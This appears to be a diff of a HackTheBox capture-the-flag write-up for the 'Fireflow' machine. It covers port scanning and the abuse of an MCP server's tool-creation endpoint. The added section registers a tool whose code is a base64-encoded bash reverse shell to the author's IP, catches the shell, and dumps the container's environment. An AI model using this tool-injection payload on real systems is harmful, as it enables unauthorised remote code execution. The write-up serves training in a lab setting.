@@ -7,10 +7,10 @@ Today we'll do the [Fireflow](https://app.hackthebox.com/machines/Fireflow) HTB'
 
 First of all we need to add the register to `/etc/hosts`:
 
-![[Fireflow - Adding host.png]]
 ```
-$ echo "10.129.88.33 fireflow.htb" | sudo tee -a /etc/hosts
-10.129.88.33 fireflow.htb
+$ echo "10.129.244.214 fireflow.htb" | sudo tee -a /etc/hosts
+10.129.244.214 fireflow.htb
+$
 ```
 
 And please, DO NOT FORGET to use `-a` if you don't want to fully rewrite your `/etc/hosts` file (already happened to me).
@@ -24,7 +24,7 @@ You can use any port scanner, like [Rustscan](https://github.com/bee-san/RustSca
 First, let's run it and then use Nmap to run default scripts (`-A`, naabu are currently implementing services and versions detection, so if you're reading this, you should check the repository for more information)
 
 ```
-[3,979s][~] ᛋᛋ naabu -host 10.129.88.33 -p -                
+[3,979s][~] ᛋᛋ naabu -host 10.129.244.214 -p -                
 
                   __
   ___  ___  ___ _/ /  __ __
@@ -36,17 +36,17 @@ First, let's run it and then use Nmap to run default scripts (`-A`, naabu are cu
 [INF] Current naabu version 2.6.1 (latest)
 [WRN] UI Dashboard is disabled, Use -dashboard option to enable
 [INF] Running CONNECT scan with non root privileges
-10.129.88.33:22
-10.129.88.33:443
-[INF] Found 2 ports on host 10.129.88.33 (10.129.88.33)
+10.129.244.214:22
+10.129.244.214:443
+[INF] Found 2 ports on host 10.129.244.214 (10.129.244.214)
 ```
 
 Alright, now we can use the nmap default scripts to get banners and others
 
 ```
-[2m14,942s][~] ᛋᛋ sudo nmap -A 10.129.88.33 -p22,443,65535 -T5
+[2m14,942s][~] ᛋᛋ sudo nmap -A 10.129.244.214 -p22,443,65535 -T5
 Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-18 16:40 -0300
-Nmap scan report for fireflow.htb (10.129.88.33)
+Nmap scan report for fireflow.htb (110.129.244.214)
 Host is up (0.17s latency).
 
 PORT      STATE  SERVICE  VERSION
@@ -76,7 +76,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 TRACEROUTE (using port 65535/tcp)
 HOP RTT       ADDRESS
 1   222.76 ms 10.10.14.1
-2   222.83 ms fireflow.htb (10.129.88.33)
+2   222.83 ms fireflow.htb (10.129.244.214)
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 24.57 seconds
@@ -1105,7 +1105,7 @@ With this, I can build a malicious request to the `ping_host` tool:
 
 Unfortunately, this didn't work, the tool is probably using `execv` directly to `/usr/bin/ping` with accurate concatenation.
 
-## Exploiting Tool Creation
+## Exploiting Tool Creation for Shell Access
 
 To build the tool creation payload, I used the swagger UI (under `GET /docs`) to create this curl command:
 
@@ -1257,5 +1257,145 @@ If this successfully connect to my machine, I'll know that I can just send a rev
 ```json
 { "status": "registered", "name": "ping_me" }
 ```
+
+Just to check it, let me list tools using the `.py` cli:
+
+```
+[1,110s][~/Hacking/CTFs/Fireflow] ᛋᛋ uv run /tmp/mcp-cli.py list | grep "ping_me" -C 6
+        "inputSchema": {
+          "type": "object",
+          "properties": {}
+        }
+      },
+      {
+        "name": "ping_me",
+        "description": "Ping my device",
+        "inputSchema": {
+          "type": "object",
+          "properties": {}
+        }
+      }
+[0,859s][~/Hacking/CTFs/Fireflow] ᛋᛋ 
+```
+
+And then run the `nc` listener, to check the connection on my side:
+
+```
+[0,859s][~/Hacking/CTFs/Fireflow] ᛋᛋ uv run /tmp/mcp-cli.py call ping_me              
+🚀 Running tool 'ping_me' at: http://localhost:51337/mcp...
+{
+  "jsonrpc": "2.0",
+  "id": 2,
+  "result": {
+    "content": [
+      {
+        "type": "text",
+        "text": "\nTraceback (most recent call last):\n  File \"<string>\", line 1, in <module>\n  File \"/usr/local/lib/python3.11/subprocess.py\", line 548, in run\n    with Popen(*popenargs, **kwargs) as process:\n         ^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"/usr/local/lib/python3.11/subprocess.py\", line 1026, in __init__\n    self._execute_child(args, executable, preexec_fn, close_fds,\n  File \"/usr/local/lib/python3.11/subprocess.py\", line 1955, in _execute_child\n    raise child_exception_type(errno_num, err_msg, err_filename)\nFileNotFoundError: [Errno 2] No such file or directory: '/usr/bin/nc'\n"
+      }
+    ],
+    "isError": true
+  }
+}
+```
+
+I just get an error that says that the netcat isn't installed, but I checked it, so this web-server is probably running inside a container. To check it, I could run the `lft` (which stands for "Layer Four Traceroute"), who gives me how many hops do I need to reach the `host:port`. If this port is being exposed by a container, I need one more hop to reach it.
+
+Unfortunately, the port is binded to `127.0.0.1`, which means that I can't reach it and `lft` just gives me this through port forwarding:
+
+```
+[10ms][~/Hacking/CTFs/Fireflow] ᛋᛋ sudo lft 127.0.0.1:51337
+Tracing ...T
+TTL LFT trace to localhost (127.0.0.1):51337/tcp
+ 1  [target open] localhost (127.0.0.1):51337 0.1ms
+ 2  [target open] localhost (127.0.0.1):51337 0.1ms
+```
+
+I decided that I should skip the ping process and directly try sending a reverse shell, so I just opened a listener in penelope to port `4445` and the created the new tool:
+
+```
+(Penelope)─(Session [1])> listeners add -i tun0 -p 4445
+[+] Listening for reverse shells on 10.10.15.160:4445 
+(Penelope)─(Session [1])> 
+```
+
+```
+{
+  "name": "rev_me",
+  "description": "Reverse shell to 10.10.15.160:4445",
+  "properties": {},
+  "code": "import subprocess as s;s.run(['/bin/sh', '-c', 'printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTUuMTYwLzQ0NDUgMD4mMSkgJg==|base64 -d|bash'], stdout=s.PIPE, stderr=s.STDOUT, text=True)"
+}
+```
+
+So let's run it:
+
+```
+[0,864s][~/Hacking/CTFs/Fireflow] ᛋᛋ uv run /tmp/mcp-cli.py call rev_me 
+🚀 Running tool 'rev_me' at: http://localhost:51337/mcp...
+{
+  "jsonrpc": "2.0",
+  "id": 2,
+  "result": {
+    "content": [
+      {
+        "type": "text",
+        "text": ""
+      }
+    ],
+    "isError": false
+  }
+}
+[1,898s][~/Hacking/CTFs/Fireflow] ᛋᛋ 
+```
+
+and (🥁🥁🥁):
+
+```
+[+] [New Reverse Shell] => mcp-server-54464cb475-29ztf 10.129.244.214 Linux-x86_64 👤 mcp(1000) 😍️ Session ID <2>
+(Penelope)─(Session [1])> 
+```
+
+# Enumeration
+
+As I didn't confirmed the container and provider, I'll check the environment variables for anything, and then grep `/proc/self/cgroups` for any interesting strings:
+
+```
+mcp@mcp-server-54464cb475-29ztf:~$ env
+SHELL=/usr/bin/bash
+KUBERNETES_SERVICE_PORT_HTTPS=443
+PYTHON_SHA256=272179ddd9a2e41a0fc8e42e33dfbdca0b3711aa5abf372d3f2d51543d09b625
+KUBERNETES_SERVICE_PORT=443
+HISTCONTROL=ignoreboth
+HOSTNAME=mcp-server-54464cb475-29ztf
+PYTHON_VERSION=3.11.15
+PWD=/home/mcp
+MCP_SERVER_SERVICE_HOST=10.43.250.195
+MCP_SERVER_SERVICE_PORT=8080
+HOME=/home/mcp
+MCP_SERVER_PORT_8080_TCP_PROTO=tcp
+LANG=C.UTF-8
+KUBERNETES_PORT_443_TCP=tcp://10.43.0.1:443
+HISTFILE=/dev/null
+LS_COLORS=<Another enormous and useless env>
+GPG_KEY=A035C8C19219BA821ECEA86B64E628F8D684696D
+MCP_SERVER_PORT_8080_TCP_PORT=8080
+MCP_SERVER_PORT_8080_TCP_ADDR=10.43.250.195
+TERM=xterm-256color
+SHLVL=2
+MCP_SERVER_PORT=tcp://10.43.250.195:8080
+KUBERNETES_PORT_443_TCP_PROTO=tcp
+MCP_SERVER_SERVICE_PORT_HTTP=8080
+KUBERNETES_PORT_443_TCP_ADDR=10.43.0.1
+MCP_SERVER_PORT_8080_TCP=tcp://10.43.250.195:8080
+KUBERNETES_SERVICE_HOST=10.43.0.1
+KUBERNETES_PORT=tcp://10.43.0.1:443
+KUBERNETES_PORT_443_TCP_PORT=443
+PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+_=/usr/bin/env
+OLDPWD=/app
+mcp@mcp-server-54464cb475-29ztf:~$ 
+```
+
+And here we go.
 
 ---
